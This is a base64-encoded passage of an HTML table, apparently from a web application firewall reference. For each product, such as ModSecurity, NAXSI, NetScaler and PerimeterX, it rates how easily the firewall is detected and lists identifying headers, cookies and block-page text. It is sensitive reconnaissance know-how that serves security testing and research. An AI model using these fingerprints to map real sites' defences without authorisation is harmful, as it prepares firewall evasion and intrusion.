ICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4K
ICAgICAgICAgICAgS09OQSBTaXRlIERlZmVuZGVyIChBa2FtYWkpCiAgICAg
ICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+
CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5
OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWlu
cyA8Y29kZT5Ba2FtYWlHSG9zdDwvY29kZT4ga2V5d29yZC48L2xpPgogICAg
ICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8
L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIExpdGVTcGVlZAogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJp
bGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9j
b2RlPiBoZWFkZXIgaGFzIHZhbHVlIHNldCB0byA8Y29kZT5MaXRlU3BlZWQ8
L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlJl
c3BvbnNlIHBhZ2UgY29udGFpbnM6PC9jb2RlPjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNv
ZGU+UHJvdWRseSBwb3dlcmVkIGJ5IExpdGVTcGVlZCBXZWIgU2VydmVyPC9j
b2RlPiB0ZXh0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT5S
ZWZlcmVuY2UgdG8gPGNvZGU+aHR0cDovL3d3dy5saXRlc3BlZWR0ZWNoLmNv
bS9lcnJvci1wYWdlPC9jb2RlPjwvbGk+CiAgICAgICAgICAgICAgICAgICAg
ICAgIDxsaT48Y29kZT5BY2Nlc3MgdG8gcmVzb3VyY2Ugb24gdGhpcyBzZXJ2
ZXIgaXMgZGVuaWVkLjwvY29kZT48L2xpPgogICAgICAgICAgICAgICAgICAg
IDwvdWw+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3Vs
PgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0
ZD4KICAgICAgICAgICAgTWFsY2FyZQogICAgICAgIDwvdGQ+CiAgICAgICAg
PHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVyYXRlPC9saT4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAg
ICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJs
b2NrZWQgcmVzcG9uc2UgcGFnZSBtYXkgY29udGFpbnM6CiAgICAgICAgICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICAgICAgICAg
IDxsaT48Y29kZT5CbG9ja2VkIGJlY2F1c2Ugb2YgTWFsaWNpb3VzIEFjdGl2
aXRpZXM8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAg
ICAgICAgICAgICAgICAgPGxpPjxjb2RlPkZpcmV3YWxsIHBvd2VyZWQgYnkg
TWFsQ2FyZTwvY29kZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgPC9saT4K
ICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAg
ICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIE1pc3Npb25Db250cm9sIEFwcGxpY2F0aW9uIFNoaWVsZAogICAg
ICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xp
PgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9n
eTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgZmllbGQg
Y29udGFpbnMgPGNvZGU+TWlzc2lvbiBDb250cm9sIEFwcGxpY2F0aW9uIFNo
aWVsZDwvY29kZT4gdmFsdWUuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAg
ICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBNb2RTZWN1cml0eQog
ICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPk1vZGVy
YXRlL0RpZmZpY3VsdDwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNl
IHBhZ2UgY29udGFpbnM6PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlRo
aXMgZXJyb3Igd2FzIGdlbmVyYXRlZCBieSBNb2RfU2VjdXJpdHk8L2NvZGU+
IHRleHQgc25pcHBldC48L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAg
ICAgPGxpPjxjb2RlPk9uZSBvciBtb3JlIHRoaW5ncyBpbiB5b3VyIHJlcXVl
c3Qgd2VyZSBzdXNwaWNpb3VzPC9jb2RlPiB0ZXh0IHNuaXBwZXQuPC9saT4K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5ydWxlcyBv
ZiB0aGUgbW9kX3NlY3VyaXR5IG1vZHVsZTwvY29kZT4gdGV4dCBzbmlwcGV0
LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+
bW9kX3NlY3VyaXR5IHJ1bGVzIHRyaWdnZXJlZDwvY29kZT4gdGV4dCBzbmlw
cGV0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+UmVm
ZXJlbmNlIHRvIDxjb2RlPi9tb2RzZWN1cml0eS1lcnJvcnBhZ2UvPC9jb2Rl
PiBkaXJlY3RvcnkuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPC91
bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2Rl
PiBoZWFkZXIgbWF5IGNvbnRhaW4gPGNvZGU+TW9kX1NlY3VyaXR5PC9jb2Rl
PiBvciA8Y29kZT5OWU9CPC9jb2RlPiBrZXl3b3Jkcy48L2xpPgogICAgICAg
ICAgICAgICAgICAgIDxsaT5Tb21ldGltZXMsIHRoZSByZXNwb25zZSBjb2Rl
IHRvIGFuIGF0dGFjayBpcyA8Y29kZT40MDM8L2NvZGU+IHdoaWxlIHRoZSBy
ZXNwb25zZSBwaHJhc2UgaXMgPGNvZGU+TW9kU2VjdXJpdHkgQWN0aW9uPC9j
b2RlPi4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+
CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRk
PgogICAgICAgICAgICBNb2RTZWN1cml0eSBDUlMKICAgICAgICA8L3RkPgog
ICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
PGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5EaWZmaWN1bHQ8L2xpPgogICAg
ICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+
PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAg
ICA8bGk+QmxvY2twYWdlIG9jY3VycyBvbiBhZGRpbmcgYSBzZXBhcmF0ZSBy
ZXF1ZXN0IGhlYWRlciA8Y29kZT5YLVNjYW5uZXI8L2NvZGU+IHdoZW4gc2V0
IHRvIGEgcGFydGljdWxhciBwYXJhbm9hIGxldmVsLjwvbGk+CiAgICAgICAg
ICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+
CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
TkFYU0kKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwv
Yj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24g
TWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBj
b25hdGlucyA8Y29kZT5UaGlzIFJlcXVlc3QgSGFzIEJlZW4gQmxvY2tlZCBC
eSBOQVhTSTwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+
UmVzcG9uc2UgaGVhZGVycyBjb250YWluIHVudXN1YWwgZmllbGQgPGNvZGU+
WC1EYXRhLU9yaWdpbjwvY29kZT4gd2l0aCB2YWx1ZSA8Y29kZT5uYXhzaS93
YWY8L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAgICAgICAgICAgICAgICA8
bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgY29udGFpbnMgPGNvZGU+
bmF4c2kvd2FmPC9jb2RlPiBrZXl3b3JkIHZhbHVlLjwvbGk+CiAgICAgICAg
ICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBtYXkgY29u
dGFpbiA8Y29kZT5OQVhTSSBibG9ja2VkIGluZm9ybWF0aW9uPC9jb2RlPiBl
cnJvciBjb2RlLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAg
ICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgog
ICAgICAgIDx0ZD4KICAgICAgICAgICAgTmVtZXNpZGEKICAgICAgICA8L3Rk
PgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5EaWZmaWN1bHQ8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbmF0aW5zIDxjb2Rl
PlN1c3BpY2lvdXMgYWN0aXZpdHkgZGV0ZWN0ZWQuIEFjY2VzcyB0byB0aGUg
c2l0ZSBpcyBibG9ja2VkLjwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAg
ICAgICA8bGk+Q29udGFpbnMgcmVmZXJlbmNlIHRvIGVtYWlsIDxjb2RlPm53
YWZAe3NpdGUudGxkfTwvY29kZT48L2xpPgogICAgICAgICAgICAgICAgPC91
bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIE5ldGNvbnRpbnV1
bQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+
CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPk1v
ZGVyYXRlPC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24g
TWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAg
ICAgICAgICAgICAgICAgICAgPGxpPlNlc3Npb24gY29va2llcyBjb250YWlu
IDxjb2RlPk5DSV9fU2Vzc2lvbklkPTwvY29kZT4gY29va2llIGZpZWxkIG5h
bWUuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwv
dWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPgogICAgICAgICAgICBOZXRTY2FsZXIgQXBwRmlyZXdhbGwKICAgICAg
ICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5Nb2RlcmF0ZTwv
bGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9s
b2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIG1heSBjb250YWluPC9s
aT4KICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5Db25uZWN0aW9uOjwvY29kZT4gaGVhZGVyIGZp
ZWxkIG5hbWUganVtYmxlZCB0byA8Y29kZT5ubkNvZWN0aW9uOjwvY29kZT48
L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+bnNfYWY9
PC9jb2RlPiBjb29raWUgZmllbGQgbmFtZS48L2xpPgogICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+Y2l0cml4X25zX2lkPC9jb2RlPiBmaWVs
ZCBuYW1lLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29k
ZT5OU0NfPC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5OUy1DQUNIRTwvY29kZT4gZmllbGQgdmFsdWUu
PC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAg
ICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAg
PC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIE5ldmlz
UHJveHkKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwv
Yj5Nb2RlcmF0ZTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0
aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVs
PgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXIgY29v
a2llcyBjb250YWluIDxjb2RlPk5hdmFqbzwvY29kZT4ga2V5d29yZC48L2xp
PgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAg
ICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIE5ld0RlZmVuZAogICAgICAgIDwvdGQ+CiAgICAgICAgPHRk
PgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxp
PjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2Ug
cGFnZSBjb250YWluczo8L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4K
ICAgICAgICAgICAgICAgICAgICAgICAgPGxpPlJlZmVyZW5jZSB0byA8Y29k
ZT5odHRwOi8vd3d3Lm5ld2RlZmVuZC5jb20vZmVlZGJhY2svbWlzaW5mb3Jt
YXRpb24vPC9jb2RlPiBVUkwuPC9saT4KICAgICAgICAgICAgICAgICAgICAg
ICAgPGxpPlJlZmVyZW5jZSB0byA8Y29kZT4vbmRfYmxvY2svPC9jb2RlPiBk
aXJlY3RvcnkuPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAg
ICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRl
ciBjb250YWlucyA8Y29kZT5OZXdEZWZlbmQ8L2NvZGU+IGtleXdvcmQuPC9s
aT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAg
ICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgog
ICAgICAgICAgICBOZXh1c2d1YXJkCiAgICAgICAgPC90ZD4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2Vk
IHJlc3BvbnNlIHBhZ2UgaGFzIHJlZmVyZW5jZSB0byA8Y29kZT5zcGVyZXNv
dXJjZXMubmV4dXNndWFyZC5jb20vd2FmcGFnZS9pbmRleC5odG1sPC9jb2Rl
PiBVUkwuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAg
IDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAg
ICAgPHRkPgogICAgICAgICAgICBOaW5qYUZpcmV3YWxsCiAgICAgICAgPC90
ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+UmVzcG9uc2UgcGFnZSB0aXRsZSBjb250YWlucyA8Y29kZT5O
aW5qYUZpcmV3YWxsOiA0MDMgRm9yYmlkZGVuPC9jb2RlPi48L2xpPgogICAg
ICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBwYWdlIGNvbnRhaW5zOgog
ICAgICAgICAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+Rm9yIHNlY3VyaXR5IHJlYXNvbnMsIGl0
IHdhcyBibG9ja2VkIGFuZCBsb2dnZWQ8L2NvZGU+IHRleHQgc25pcHBldC48
L2xpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPk5p
bmphRmlyZXdhbGw8L2NvZGU+IGtleXdvcmQgaW4gdGl0bGUuPC9saT4KICAg
ICAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgICAg
ICA8L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXR1cm5zIGEgPGNv
ZGU+NDAzIEZvcmJpZGRlbjwvY29kZT4gcmVzcG9uc2UgdXBvbiBtYWxpY2lv
dXMgcmVxdWVzdHMuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAg
ICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+
CiAgICAgICAgPHRkPgogICAgICAgICAgICBOU0ZvY3VzCiAgICAgICAgPC90
ZD4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48
L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAg
IDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWluIDxjb2Rl
Pk5TRm9jdXM8L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAgICAgICAgICAg
IDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwv
dHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAgICBOdWxsRERv
UwogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+
CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVh
c3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRo
b2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAg
ICAgICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIg
Y29udGFpbnMgdGhlIDxjb2RlPk51bGxERG9TIFN5c3RlbTwvY29kZT4ga2V5
d29yZC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
PC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAg
ICA8dGQ+CiAgICAgICAgICAgIG9uTWVzc2FnZSBTaGllbGQKICAgICAgICA8
L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAg
ICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAg
ICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9i
PjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAg
ICAgPGxpPlJlc3BvbnNlIGhlYWRlcnMgY29udGFpbiBoZWFkZXIgPGNvZGU+
WC1FbmdpbmU8L2NvZGU+IGZpZWxkIHdpdGggdmFsdWUgPGNvZGU+b25NZXNz
YWdlIFNoaWVsZDwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgICAgICA8
bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgICAgICA8
bGk+PGNvZGU+QmxhY2tiYXVkIEstMTIgY29uZHVjdHMgcm91dGluZSBtYWlu
dGVuYW5jZTwvY29kZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAg
ICAgICAgICA8bGk+PGNvZGU+VGhpcyBzaXRlIGlzIHByb3RlY3RlZCBieSBh
biBlbmhhbmNlZCBzZWN1cml0eSBzeXN0ZW08L2NvZGU+LjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgICAgIDxsaT5SZWZlcmVuY2UgdG8gPGNvZGU+aHR0
cHM6Ly9zdGF0dXMuYmxhY2tiYXVkLmNvbTwvY29kZT4gVVJMLjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgICAgIDxsaT5SZWZlcmVuY2UgdG8gPGNvZGU+
aHR0cHM6Ly9tYWludGVuYW5jZS5ibGFja2JhdWQuY29tPC9jb2RlPiBVUkwu
PC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAg
ICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAg
PC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIE9wZW5S
ZXN0eSBMdWEgV0FGCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2Nv
ZGU+IGhlYWRlciBjb250YWlucyA8Y29kZT5vcGVucmVzdHkve3ZlcnNpb259
PC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxp
PkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWlucyA8Y29kZT5vcGVucmVz
dHkve3ZlcnNpb259PC9jb2RlPiB0ZXh0LjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgY29kZSByZXR1cm5lZCBpcyA8
Y29kZT40MDYgTm90IEFjY2VwdGFibGU8L2NvZGU+LjwvbGk+CiAgICAgICAg
ICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+
CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
UGFsbyBBbHRvCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5
OiA8L2I+TW9kZXJhdGU8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAg
IDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25z
ZSBwYWdlIGNvbnRhaW5zIDxjb2RlPlZpcnVzL1NweXdhcmUgRG93bmxvYWQg
QmxvY2tlZDwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+
UmVzcG9uc2UgcGFnZSBtaWdodCBjb250YWluIDxjb2RlPlBhbG8gQWx0byBO
ZXh0IEdlbmVyYXRpb24gU2VjdXJpdHkgUGxhdGZvcm08L2NvZGU+IHRleHQg
c25pcHBldC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAg
ICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIFBlbnRhV0FGCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT48Y29kZT5TZXJ2ZXI8L2NvZGU+IGhlYWRlciBjb250YWlucyA8Y29kZT5Q
ZW50YVdBRi97dmVyc2lvbn08L2NvZGU+IGtleXdvcmQuPC9saT4KICAgICAg
ICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRh
aW5zIHRleHQgPGNvZGU+UGVudGFXQUYve3ZlcnNpb259PC9jb2RlPi48L2xp
PgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAg
ICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIFBlcmltZXRlclgKICAgICAgICA8L3RkPgogICAgICAgIDx0
ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxs
aT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAg
ICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQg
cmVzcG9uc2UgcGFnZSBjb250YWlucyByZWZlcmVuY2UgdG88YnI+IDxjb2Rl
Pmh0dHBzOi8vd3d3LnBlcmltZXRlcnguY29tL3doeXdhc2libG9ja2VkPC9j
b2RlPiBVUkwuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAg
